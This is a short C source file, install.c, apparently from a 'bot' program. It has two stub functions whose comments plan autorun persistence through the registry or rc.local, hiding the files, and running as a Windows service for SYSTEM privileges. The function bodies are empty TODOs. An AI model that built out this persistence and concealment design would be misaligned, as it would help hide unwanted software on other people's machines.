/*
 *   Author           : 93aef0ce4dd141ece6f5
 *   Title            : install.c
 *   Description      : installation of program
 *                      functions go here
 *  
 *   Copyright (C) 2016  93aef0ce4dd141ece6f5
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

#include <windows.h>

#elif defined(__linux__)

// headers here

#endif

#include "bot.h"

/*
 * sets program to autorun
 * on boot
 * maybe relocate the files
 * to another directory
 * to hide?
 */
int install_startup (const char *self) {
    // TODO
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__)

    // install registry

#elif defined(__linux__)

    // copy program to /etc/rc.d/rc.local

#endif

    return TRUE;
}

/*
 * install to windows service
 * to enable SYSTEM privileges
 */
int install_service (const char *self) {
    // TODO

    return TRUE;
}